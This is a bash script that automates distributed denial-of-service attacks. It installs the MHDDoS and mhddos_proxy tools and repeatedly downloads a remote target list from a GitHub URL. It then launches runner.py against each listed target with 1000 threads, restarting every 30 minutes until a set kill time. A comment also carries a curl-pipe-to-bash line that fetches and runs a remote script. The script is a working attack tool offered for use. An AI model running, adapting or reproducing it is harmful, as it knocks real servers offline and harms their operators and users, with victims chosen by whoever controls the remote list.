#!/bin/bash
# curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash

usage() {
cat << EOF
usage: ./auto_bash.sh [-t|-r|--table]
                        [-t THREADS]      (default = 1000)
                        [-r RPC]          (default = 2000)
                        [--table]         (default = off)
                        [-k HOURS]        (defaul  = 999)
                        [-h]              show this menu
EOF
}

startddos () {
# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
sudo apt update -qq -y
sudo apt install git python3 python3-pip -qq -y
# for some virtual cloud systems based on debian (like GC)
# sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo pip install --upgrade pip

cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
python3 -m pip install -r ~/mhddos_proxy/requirements.txt
cd mhddos_proxy
git clone https://github.com/MHProDev/MHDDoS.git

echo $threads
echo $rpc
echo $debug
echo $table

KILL_TIME=$(expr $KILL_TIME \* 3600)
while true; do
pkill -f start.py; pkill -f runner.py
echo "$SECONDS of $KILL_TIME seconds passed"
echo "Script will stop in $(expr $KILL_TIME - $SECONDS) seconds"
if [ "$SECONDS" -lt "$KILL_TIME" ]
then
   # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
   list_size=$(curl -s $target_url | cat | grep "^[^#]" | wc -l)
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s $target_url | cat | grep "^[^#]" | wc -l)
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s $target_url | cat | grep "^[^#]")")
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug $table&
      done
sleep 30m
else
      exit 1
fi
done
}

#target_url="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/tg_test"
target_url="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"

SECONDS=0
KILL_TIME=999
threads="-t 1000"
rpc="--rpc 2000"
debug="--debug"
table=""

while [ "$1" != "" ]; do   pkill -f start.py; pkill -f runner.py
    case $1 in
      -t | --threads )   threads="-t $2"; shift 2;;
      -r | --rpc )    rpc="--rpc $2";  shift 2  ;;
      -k | --kill )    KILL_TIME="$2";  shift 2  ;;
      -h | --help )      usage;   exit  ;;
      --table )   table="--table"; shift ;;
      * )                usage    exit 1
    esac
done

startddos
